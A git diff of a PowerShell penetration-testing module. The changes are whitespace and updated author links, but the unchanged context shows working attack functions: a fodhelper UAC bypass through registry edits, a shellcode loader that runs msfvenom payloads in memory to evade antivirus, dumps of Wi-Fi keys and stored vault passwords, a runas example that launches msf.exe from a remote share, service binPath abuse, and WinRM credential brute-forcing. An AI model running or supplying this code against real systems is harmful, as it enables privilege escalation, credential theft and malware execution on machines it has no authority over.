@@ -27,8 +27,8 @@ Convert-Base64 -Value 'Hello World!'' -Encode
 .EXAMPLE
 Convert-Base64 -Value 'SGVsbG8gV29ybGQh' -Decode -TextEncoding ASCII
 # This example decodes Base64 to a string in ASCII format
-    
-    
+
+
 .NOTES
 Author: Robert H. Osborne
 Alias: tobor
@@ -38,13 +38,13 @@ Contact: rosborne@osbornepro.com
 .LINK
 https://powershell.org/2020/11/writing-your-own-powershell-functions-cmdlets/
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 
 
@@ -83,7 +83,7 @@ Function Convert-Base64 {
             [String]$TextEncoding = 'UTF8'
         ) # End param
 
-PROCESS 
+PROCESS
 {
 
     Switch ($PSCmdlet.ParameterSetName)
@@ -123,18 +123,18 @@ PROCESS
                 $Error[0]
 
             } # End Catch
-            
+
         }  # End Switch Encode
 
         'Decode' {
-            
+
             $EncodedValue = [System.Convert]::FromBase64String("$Value")
 
             Switch ($TextEncoding)
             {
 
                 'ASCII' {
-                    
+
                     Try
                     {
 
@@ -147,11 +147,11 @@ PROCESS
                         Throw "Base64 entered was not in a correct format. The value received is below. `n$Value"
 
                     } # End Catch
-                
+
                 }  # End Switch ASCII
 
                 'BigEndianUnicode' {
-                    
+
                     Try
                     {
 
@@ -164,11 +164,11 @@ PROCESS
                         Throw "Base64 entered was not in a correct format. The value received is below. `n$Value"
 
                     } # End Catch
-                
+
                 }  # End Switch BigEndianUnicode
 
                 'Default' {
-                    
+
                     Try
                     {
 
@@ -181,11 +181,11 @@ PROCESS
                         Throw "Base64 entered was not in a correct format. The value received is below. `n$Value"
 
                     } # End Catch
-                
+
                 }  # End Switch Default
 
                 'Unicode' {
-                    
+
                     Try
                     {
 
@@ -198,11 +198,11 @@ PROCESS
                         Throw "Base64 entered was not in a correct format. The value received is below. `n$Value"
 
                     } # End Catch
-                
+
                 }  # End Switch Unicode
 
                 'UTF32'  {
-                    
+
                     Try
                     {
 
@@ -215,11 +215,11 @@ PROCESS
                         Throw "Base64 entered was not in a correct format. The value received is below. `n$Value"
 
                     } # End Catch
-                
+
                 }  # End Switch UTF32
 
                 'UTF7' {
-                    
+
                     Try
                     {
 
@@ -232,11 +232,11 @@ PROCESS
                         Throw "Base64 entered was not in a correct format. The value received is below. `n$Value"
 
                     } # End Catch
-                
+
                 }  # End Swithc UTF7
 
                 'UTF8' {
-                    
+
                     Try
                     {
 
@@ -249,7 +249,7 @@ PROCESS
                         Throw "Base64 entered was not in a correct format. The value received is below. `n$Value"
 
                     } # End Catch
-    
+
                 }  # End Switch UTF8
 
             }  # End Switch
@@ -279,7 +279,7 @@ If the SID parameter value is specified this cmdlet will result in the username 
 $Pipe = New-Object PSObject -Property @{SID='S-1-5-21-2860287465-2011404039-792856344-500'} ; $Pipe | Convert-SID
 # This example uses the pipeline to convert an SID to a username
 
-.EXAMPLE 
+.EXAMPLE
 Convert-SID -Username 'j.smith'
 # This example gets the SID for j.smith
 
@@ -304,13 +304,13 @@ Contact: rosborne@osbornepro.com
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 
 
@@ -400,7 +400,7 @@ Return cached passwords for the current user, WiFi passwords, SNMP passwords, an
 
 
 .PARAMETER All
-This switch parameter indicates you want to return all stored and saved credentials. 
+This switch parameter indicates you want to return all stored and saved credentials.
 
 .PARAMETER AutoLogon
 This switch parameter indicates you want to retrieve the autologon credentials
@@ -432,13 +432,13 @@ Contact: rosborne@osbornepro.com
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 
 
@@ -545,9 +545,9 @@ Function Get-ClearTextPassword {
 
                 Get-Content -Path $PassFile | Select-String -Pattern "Password"
 
-            }  # End If 
+            }  # End If
 
-        }  # End ForEach 
+        }  # End ForEach
 
     }  # End If
 
@@ -610,13 +610,13 @@ Contact: rosborne@osbornepro.com
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 
 
@@ -696,7 +696,7 @@ PROCESS
 #================================================================
 #  SECURITY PATCHES
 #================================================================
-    Write-Output "=================================`n| OPERATING SYSTEM INFORMATION |`n=================================" 
+    Write-Output "=================================`n| OPERATING SYSTEM INFORMATION |`n================================="
     Get-CimInstance -ClassName "Win32_OperatingSystem" | Select-Object -Property Name,Caption,Description,CSName,Version,BuildNumber,OSArchitecture,SerialNumber,RegisteredUser
 
     Write-Output "=================================`n|      DOMAIN INFORMATION      |`n================================="
@@ -707,10 +707,10 @@ PROCESS
 
     If ($Domain) { Write-Output "DOMAIN: $Domain"}
     If ($DCs) { Write-Output "DOMAIN CONTROLLERS`n--------------------------"}
-    $DCs 
+    $DCs
     If ($PDC) { Write-Output "PRIMARY DC: $PDC"}
 
-    Write-Output "=================================`n| HOTFIXES INSTALLED ON DEVICE |`n=================================" 
+    Write-Output "=================================`n| HOTFIXES INSTALLED ON DEVICE |`n================================="
     Get-CimInstance -Query 'SELECT * FROM Win32_QuickFixEngineering'
 
     $WDigestCaching = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest").UseLogonCredential
@@ -728,7 +728,7 @@ PROCESS
 #===================================================================
 #  NETWORK SHARES AND DRIVES
 #===================================================================
-Write-Output "=================================`n|  NEWORK SHARE DRIVES  |`n=================================" 
+Write-Output "=================================`n|  NEWORK SHARE DRIVES  |`n================================="
 Get-CimInstance -ClassName Win32_Share
 
 #===================================================================
@@ -747,13 +747,13 @@ Get-CimInstance -ClassName Win32_Share
 #==========================================================================
 #  ANTIVIRUS APPLICATION INFORMATION
 #==========================================================================
-    Write-Output "=================================`n|    ANTI-VIRUS INFORMATION    |`n=================================" 
+    Write-Output "=================================`n|    ANTI-VIRUS INFORMATION    |`n================================="
     Get-AntiVirusProduct
 
 #==========================================================================
 #  USER, USER PRIVILEDGES, AND GROUP INFO
 #==========================================================================
-    Write-Output "=================================`n|  LOCAL ADMIN GROUP MEMBERS  |`n=================================" 
+    Write-Output "=================================`n|  LOCAL ADMIN GROUP MEMBERS  |`n================================="
     Get-LocalGroupMember -Group "Administrators" | Format-Table -Property "Name","PrincipalSource"
 
 
@@ -761,23 +761,23 @@ Get-CimInstance -ClassName Win32_Share
     Get-CimInstance -ClassName "Win32_UserAccount" | Format-Table -AutoSize
 
 
-    Write-Output "=================================`n|       GROUPS LIST       |`n=================================" 
+    Write-Output "=================================`n|       GROUPS LIST       |`n================================="
     Get-CimInstance -ClassName "Win32_GroupUser" | Format-Table -AutoSize
 
 
-    Write-Output "=================================`n|  CURRENT USER PRIVS   |`n=================================" 
+    Write-Output "=================================`n|  CURRENT USER PRIVS   |`n================================="
     whoami /priv
 
 
-    Write-Output "=================================`n| USERS WHO HAVE HOME DIRS |`n=================================" 
+    Write-Output "=================================`n| USERS WHO HAVE HOME DIRS |`n================================="
     Get-ChildItem -Path C:\Users | Select-Object -Property "Name"
 
 
-    Write-Output "=================================`n|  CLIPBOARD CONTENTS  |`n=================================" 
+    Write-Output "=================================`n|  CLIPBOARD CONTENTS  |`n================================="
     Get-Clipboard
 
 
-    Write-Output "=================================`n|  SAVED CREDENTIALS  |`n=================================" 
+    Write-Output "=================================`n|  SAVED CREDENTIALS  |`n================================="
     cmdkey /list
     Write-Output "If you find a saved credential it can be used issuing a command in the below format: "
     Write-Output 'runas /savecred /user:WORKGROUP\Administrator "\\###.###.###.###\FileShare\msf.exe"'
@@ -785,11 +785,11 @@ Get-CimInstance -ClassName Win32_Share
     [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object -TypeName Windows.Security.Credentials.PasswordVault).RetrieveAll() | ForEach-Object { $_.RetrievePassword(); $_ }
 
 
-    Write-Output "=================================`n|  SIGNED IN USERS  |`n=================================" 
+    Write-Output "=================================`n|  SIGNED IN USERS  |`n================================="
     Get-CimInstance -ClassName Win32_LoggedOnUser
 
 
-    Write-Output "=========================================`n|  CURRENT KERBEROS TICKET PERMISSIONS  |`n=========================================" 
+    Write-Output "=========================================`n|  CURRENT KERBEROS TICKET PERMISSIONS  |`n========================================="
     [System.Security.Principal.WindowsIdentity]::GetCurrent()
 
 #==========================================================================
@@ -809,36 +809,36 @@ Get-CimInstance -ClassName Win32_Share
 
     Write-Output "=================================`n|  ESTABLISHED CONNECTIONS  |`n================================="
     $OutputObj = @()
-    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()            
-    $Connections = $TCPProperties.GetActiveTcpConnections()            
-    ForEach ($Connection in $Connections) 
+    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()
+    $Connections = $TCPProperties.GetActiveTcpConnections()
+    ForEach ($Connection in $Connections)
     {
 
-        If ($Connection.LocalEndPoint.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } Else { $IPType = "IPv6" }            
+        If ($Connection.LocalEndPoint.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } Else { $IPType = "IPv6" }
         $OutputObj += New-Object -TypeName PSObject -Property @{LocalAddress=$Connection.LocalEndPoint.Address; LocalPort=$Connection.LocalEndPoint.Port; RemoteAddress=$Connection.RemoteEndPoint.Address; RemotePort=$Connection.RemoteEndPoint.Port; State=$Connection.State; AddressType=$IPType}
 
     }  # End ForEach
     $OutputObj | Format-Table -AutoSize
 
-    Write-Output "=================================`n|  DNS SERVERS  |`n=================================" 
+    Write-Output "=================================`n|  DNS SERVERS  |`n================================="
     Get-DnsClientServerAddress -AddressFamily "IPv4" | Select-Object -Property "InterfaceAlias","ServerAddresses" | Format-Table -AutoSize
 
 
-    Write-Output "=================================`n|  ROUTING TABLE  |`n=================================" 
+    Write-Output "=================================`n|  ROUTING TABLE  |`n================================="
     Get-NetRoute | Select-Object -Property "DestinationPrefix","NextHop","RouteMetric" | Format-Table -AutoSize
 
 
-    Write-Output "=================================`n|    ARP NEIGHBOR TABLE    |`n=================================" 
+    Write-Output "=================================`n|    ARP NEIGHBOR TABLE    |`n================================="
     Get-NetNeighbor | Select-Object -Property "IPAddress","LinkLayerAddress","State" | Format-Table -AutoSize
 
 
-    Write-Output "=================================`n|  Wi-Fi Passwords  |`n=================================" 
+    Write-Output "=================================`n|  Wi-Fi Passwords  |`n================================="
     (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
 
 #==========================================================================
 #  APPLICATION INFO
 #==========================================================================
-    Write-Output "=================================`n| INSTALLED APPLICATIONS |`n=================================" 
+    Write-Output "=================================`n| INSTALLED APPLICATIONS |`n================================="
     $Paths = 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\','HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\'
     ForEach ($Path in $Paths)
     {
@@ -847,7 +847,7 @@ Get-CimInstance -ClassName Win32_Share
 
     }  # End ForEach
 
-    Write-Output "=================================`n| STARTUP APPLICATIONS |`n=================================" 
+    Write-Output "=================================`n| STARTUP APPLICATIONS |`n================================="
     Get-CimInstance -ClassName "Win32_StartupCommand" | Select-Object -Property "Name","Command","Location","User" | Format-Table -AutoSize
 
     $StartupAppCurrentUser = (Get-ChildItem -Path "C:\Users\$env:USERNAME\Start Menu\Programs\Startup" | Select-Object -ExpandProperty "Name" | Out-String).Trim()
@@ -878,15 +878,15 @@ Get-CimInstance -ClassName Win32_Share
 #==========================================================================
 #  PROCESS AND SERVICE ENUMERATION
 #==========================================================================
-    Write-Output "=================================`n|  PROCESS ENUMERATION  |`n=================================" 
+    Write-Output "=================================`n|  PROCESS ENUMERATION  |`n================================="
     Get-Process -IncludeUserName | Format-Table -AutoSize
 
 
-    Write-Output "=================================`n|  SERVICE ENUMERATION  |`n=================================" 
+    Write-Output "=================================`n|  SERVICE ENUMERATION  |`n================================="
     Get-cimInstance -ClassName Win32_Service
 
 
-    Write-Output "=================================`n|  ENVIRONMENT VARIABLES  |`n=================================" 
+    Write-Output "=================================`n|  ENVIRONMENT VARIABLES  |`n================================="
     [Environment]::GetEnvironmentVariables()
 
 #==========================================================================
@@ -897,9 +897,9 @@ Get-CimInstance -ClassName Win32_Share
 
     $Bookmarks = [Environment]::GetFolderPath('Favorites')
     Get-ChildItem -Path $BookMarks -Recurse -Include "*.url" | ForEach-Object {
-        
+
         Get-Content -Path $_.FullName | Select-String -Pattern URL
-        
+
     }  # End ForEach-Object
 
 }  # End PROCESS
@@ -1139,13 +1139,13 @@ Contact: rosborne@osbornepro.com
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 
 
@@ -1469,7 +1469,7 @@ This parameter can be used to define a remote computer(s) name to check for the 
 .EXAMPLE
 Get-NetworkShareInfo -ShareName NETLOGON,SYSVOL
 # The above example returns information on the network shares NETLOGON and SYSVOL if they exist on the local machine
-    
+
 .EXAMPLE
 Get-NetworkShareInfo -ShareName NETLOGON,SYSVOL,C$ -ComputerName DC01.domain.com, DC02.domain.com, 10.10.10.1
 # The above example returns share info on NETLOGON, SYSVOL, and C$ if they exist on 3 remote devices
@@ -1483,13 +1483,13 @@ Contact: rosborne@osbornepro.com
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 
 
@@ -1534,7 +1534,7 @@ BEGIN
     {
 
         $ComputerName = $env:COMPUTERNAME
-        
+
     }   # End If
 
 }  # End BEGIN
@@ -1594,7 +1594,7 @@ This function is used to bypass UAC restrictions for the currently logged in use
 .PARAMETER Program
 Specify the absolute or relative path for executable or application you wish to run with elevated permissions. Specifies a local script that this cmdlet runs with elevated permissions. The script must exist on the local  computer or in a directory that the local computer can access.
 
-    
+
 .DESCRIPTION
 This cmdlet is used to open an application with full administrative privileges for the currently logged in administrative user. If the registry settings are not configured to prevent this from working it will mention what can be done to prevent this from working.
 
@@ -1620,25 +1620,25 @@ Contact: rosborne@osbornepro.com
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 
-    
+
 .INPUTS
 [System.IO]
-    
+
 
 .OUTPUTS
 None
-    
+
 #>
-Function Invoke-FodhelperBypass { 
+Function Invoke-FodhelperBypass {
     [CmdletBinding()]
         Param(
             [Parameter(
@@ -1648,10 +1648,10 @@ Function Invoke-FodhelperBypass {
                 ValueFromPipelineByPropertyName=$True,
                 HelpMessage='Enter an executable you wish to execute to gain privesc. Default value is cmd /c start powershell.exe')]  # End Parameter
         [String]$Program = "cmd /c start powershell.exe")  # End param
- 
-    BEGIN 
+
+    BEGIN
     {
-        
+
         $Value = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" | Select-Object -Property "ConsentPromptBehaviorAdmin"
 
         Switch ($Value.ConsentPromptBehaviorAdmin)
@@ -1670,13 +1670,13 @@ Function Invoke-FodhelperBypass {
             Write-Host "This device is not vulnerable to the fodhelper UAC bypass method. `nUAC Settings: $Message" -ForegroundColor "Green"
 
             Pause
-            
-            Exit 
+
+            Exit
 
         }  # End If
-        Else 
+        Else
         {
-            
+
             Write-Host "This device is vulnerable to the fodhelper bypass method. `nCurrent UAC Settings: $Message" -ForegroundColor "Yellow"
 
             Write-Host "To defend against the fodhelper UAC bypass there are 2 precautions to take.`n1.) Do not sign in with a user who is a member of the local administraors group. `n2.) Change HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System's values ConsentPromptBehaviorAdmin to a value of 1 or 2."
@@ -1684,7 +1684,7 @@ Function Invoke-FodhelperBypass {
         }  # End Else
 
         Write-Verbose "Adding registry values..."
-        
+
         New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\Command" -Force
 
         New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\Command" -Name "DelegateExecute" -Value "" -Force
@@ -1692,15 +1692,15 @@ Function Invoke-FodhelperBypass {
         Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\Command" -Name "(default)" -Value $Program -Force
 
     }  # End BEGIN
-    PROCESS 
+    PROCESS
     {
-        
+
         Write-Verbose "Executing fodhelper.exe and $Program..."
 
         Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
-        
-    }  # End PROCESS 
-    END 
+
+    }  # End PROCESS
+    END
     {
 
         Write-Verbose "Removing registry values as they should be no longer needed..."
@@ -1723,15 +1723,15 @@ Injects an msfvenom payload into a Windows machines memory as a way to attempt e
 This cmdlet is used to attempt bypassing AV software by injecting shell code in a byte arrary into a separate thread of specially allocated memory. It is possible that this will not be able to execute a certain Windows devices as the DLLs or user permissions may prevent the execution of this function.
 
 
-.EXAMPLE 
+.EXAMPLE
 Invoke-InMemoryPayload -ShellCode 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90
 # This command injects NOP bits into a separate thread of specially allocated memory on a Windows machine.
 
 
 .PARAMETER ShellCode
 This parameter accepts byte input only. Qutations should not be used around your defined bytes as this will convert your bytes to strings
-    
-    
+
+
 .INPUTS
 [System.Byte[]]
 
@@ -1748,13 +1748,13 @@ Contact: rosborne@osbornepro.com
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 
 #>
@@ -1764,7 +1764,7 @@ Function Invoke-InMemoryPayload {
             [Parameter(
                 Mandatory=$True,
                 Position=0,
-                ValueFromPipeline=$True, 
+                ValueFromPipeline=$True,
                 ValueFromPipelineByPropertyName=$True,
                 HelpMessage='Generate an msfvenom payload. Copy the value of the byte variable and place it here.')]  # End Parameter
             [Byte[]]$ShellCode
@@ -1782,7 +1782,7 @@ public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
     $WinFunc = Add-Type -MemberDefinition $CSCode -Name "Win32" -Namespace "Win32Functions" -PassThru
     $Size = 0x1000
 
-    If ($ShellCode.Length -gt 0x1000) 
+    If ($ShellCode.Length -gt 0x1000)
     {
 
         $Size = $ShellCode.Length
@@ -1795,12 +1795,12 @@ public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
     $X = $WinFunc::VirtualAlloc(0,$Size,0x3000,0x40)
 
     Write-Verbose "Writing payload to newly allocated memory block using memset()..."
-    For ( $i = 0 ; $i -le ($ShellCode.Length - 1); $i++ ) 
+    For ( $i = 0 ; $i -le ($ShellCode.Length - 1); $i++ )
     {
-        
-        Try 
+
+        Try
         {
-        
+
             $WinFunc::memset([IntPtr]($x.ToInt32()+$i), $ShellCode[$i], 1)
 
         }  # End Try
@@ -1818,26 +1818,26 @@ public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
         }  # End Catch
         Catch
         {
- 
+
             Write-Host "I have not caught this error before. Please email me the results at rosborne@osbornepro.com" -ForegrounColor 'Cyan'
 
             $Error[0]
-            
+
             Pause
-            
+
             Exit
 
         }  # End Catch
-        
+
     }  # End For
 
     Write-Verbose "Executing in separte thread using CreateThread()..."
     $WinFunc::CreateThread(0,0,$X,0,0,0)
     For (;;)
     {
-        
+
         Start-sleep -Seconds 60
-    
+
     }  # End For
 
 }  # End Invoke-InMemoryPayload
@@ -1872,13 +1872,13 @@ Defines the Class C subnet range to perform the ping sweep. Enter a string consi
 .PARAMETER Start
 Defines the start IPv4 address the ping sweep should begin the sweep from.
 
-.PARAMETER End 
+.PARAMETER End
 Defines the end IPv4 address the ping sweep should end at.
 
 .PARAMETER Count
 Defines how many ICMP ping requests should be sent to each host's IPv4 address
 
-.PARAMETER Source 
+.PARAMETER Source
 Defines whether you want to mask the IP address you are pinging from.
 
 
@@ -1899,13 +1899,13 @@ Contact: rosborne@osbornepro.com
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 
 #>
@@ -2005,7 +2005,7 @@ Function Invoke-PingSweep {
 
                         $SourceIP = "$ClassC.$x"
 
-                        # Uncomment the below line if you wish to see the source ip the ping is being sent from 
+                        # Uncomment the below line if you wish to see the source ip the ping is being sent from
                         # Write-Host "Sending ping from $SourceIP to $IP"
 
                         Try
@@ -2073,13 +2073,13 @@ Contact: rosborne@osbornepro.com
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 
 
@@ -2165,7 +2165,7 @@ PROCESS
         ForEach($ServiceCommand in $Commands)
         {
 
-            Write-Verbose "[*] Modifying service binPath value to: $ServiceCommand"           
+            Write-Verbose "[*] Modifying service binPath value to: $ServiceCommand"
             cmd /c sc config $ServiceName binPath="$ServiceCommand"
 
             Write-Verbose "[*] Starting $ServiceName to execute '$ServiceCommand'"
@@ -2205,12 +2205,12 @@ This cmdlet is for easily using credentials to execute a program. PowerShell can
 
 
 .PARAMETER Username
-Enter a string containing the domain or workgroup of the user and the username or in some cases just the username.    
+Enter a string containing the domain or workgroup of the user and the username or in some cases just the username.
 
-               
+
 .PARAMETER Passwd
-Enter the string value of the users password    
-               
+Enter the string value of the users password
+
 .PARAMETER FilePath
 Defines the location of the application that should execute as the user. Enter a string consisting of the absolute or relative path to the executable
 
@@ -2219,7 +2219,7 @@ Define a single or multiple FQDN's or hostnames. The local file you specify will
 
 .DESCRIPTION
 This function is used to execute an application as another user. This DOES NOT accept command line arugments. This only executes an application.
-    
+
 
 .EXAMPLE
 Invoke-UseCreds -Username 'OsbornePro\tobor' -Passwd 'P@ssw0rd1!' -FilePath 'C:\Windows\System32\spool\drivers\color\msf.exe'
@@ -2234,20 +2234,20 @@ Contact: rosborne@osbornepro.com
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
-    
-    
+
+
 .INPUTS
 [System.String]
-    
-    
+
+
 .OUTPUTS
 None
 
@@ -2275,19 +2275,19 @@ Function Invoke-UseCreds {
                 ValueFromPipeline=$False,
                 HelpMessage="Define the path to the executable you want run as this user: ")]
             [String]$FilePath,
-            
+
             [Parameter(
               ParameterSetName='Remote',
               Mandatory=$False,
               ValueFromPipeline=$False)]  # End Parameter
             [String[]]$ComputerName,
-            
+
             [Parameter(
               ParameterSetName='Remote',
               Mandatory=$False)]  # End Parameter
             [Switch][Bool]$UseSSL)  # End param
 
-BEGIN 
+BEGIN
 {
 
     Write-Verbose "[*] Building authenticated credential..."
@@ -2296,22 +2296,22 @@ BEGIN
     $Cred = New-Object -TypeName System.Management.Automation.PSCredential($Username, $Passw)
 
 }  # End BEGIN
-PROCESS 
+PROCESS
 {
 
     Switch ($PSCmdlet.ParameterSetName)
     {
-    
+
       'Local' {
-    
+
                 Write-Verbose "Executing $FilePath"
                 If (Test-Path -Path $FilePath)
-                { 
+                {
 
-                    Try 
+                    Try
                     {
 
-                        Start-Process -FilePath $FilePath -Credential $Cred 
+                        Start-Process -FilePath $FilePath -Credential $Cred
 
                     }  # End Try
                     Catch [System.Security.Authentication.AuthenticationException]
@@ -2320,46 +2320,46 @@ PROCESS
                         Throw "The credentials you entered were incorrect"
 
                     }  # End Catch
-                    Catch 
+                    Catch
                     {
 
-                        $Error[0] 
+                        $Error[0]
 
                     }  # End Catch
 
-                }  # End If 
-                Else 
+                }  # End If
+                Else
                 {
 
                     Throw "$FilePath could not be found at that location"
 
                 }  # End Else
-                
+
       }  # End Local Switch
-     
+
       'Remote' {
-     
+
                 $Bool = $False
                 If ($UseSSL.IsPresent)
                 {
-                
+
                     $Bool = $True
-                    
+
                 }  # End If
-                
+
                 ForEach ($C in $ComputerName)
                 {
 
                     Invoke-Command -HideComputerName $C -UseSSL:$Bool -FilePath $FilePath
 
                 }  # End ForEach
-     
+
       }  # End Remote Switch
-     
+
     }  # End Switch
 
-}  # End PROCESS 
-END 
+}  # End PROCESS
+END
 {
 
     Write-Output "[*] Program has been executed: $FilePath"
@@ -2385,10 +2385,10 @@ The port parameter is for easily defining what port the http server should liste
 .EXAMPLE
 Start-SimpleHTTPServer
 # This example starts an HTTP server on port 8000 in the current directory.
-    
+
 .EXAMPLE
 Start-SimpleHTTPServer -Port 80
-# This example starts an HTTP server on port 80 in the current directory.   
+# This example starts an HTTP server on port 80 in the current directory.
 
 
 .NOTES
@@ -2399,13 +2399,13 @@ Contact: rosborne@osbornepro.com
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 
 
@@ -2453,7 +2453,7 @@ Function Start-SimpleHTTPServer {
         [array]$Content = @()
 
         $LocalPath = $RequestUrl.LocalPath
-        
+
         Try
         {
 
@@ -2463,7 +2463,7 @@ Function Start-SimpleHTTPServer {
 
             If($RequestedItem.Attributes -Match "Directory")
             {
-            
+
                 Function Get-DirectoryContent {
                     [CmdletBinding(SupportsShouldProcess = $True)]
                         param (
@@ -2541,11 +2541,11 @@ Function Start-SimpleHTTPServer {
             {
 
                 $Content = [System.IO.File]::ReadAllBytes($FullPath)
-                
+
                 $Response.ContentType = [System.Web.MimeMapping]::GetMimeMapping($FullPath)
 
             }  # End Else
-            
+
         }  # End Try
         Catch [System.UnauthorizedAccessException]
         {
@@ -2630,7 +2630,7 @@ Test-BruteForceCredentials -ComputerName DC01.domain.com -UseSSL -Username 'admi
 # This example will test the one password defined against both the admin and administrator users on the remote computer DC01.domain.com using WinRM over HTTPS with a time interval of 5 minutes between each attempt
 
 .EXAMPLE
-Test-BruteForceCredentials -ComputerName File.domain.com -UserFile C:\Temp\users.txt -PassFile C:\Temp\rockyou.txt 
+Test-BruteForceCredentials -ComputerName File.domain.com -UserFile C:\Temp\users.txt -PassFile C:\Temp\rockyou.txt
 # This example will test every password in rockyou.txt against every username in the users.txt file without any pause between tried attempts
 
 
@@ -2642,13 +2642,13 @@ Contact: rosborne@osbornepro.com
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
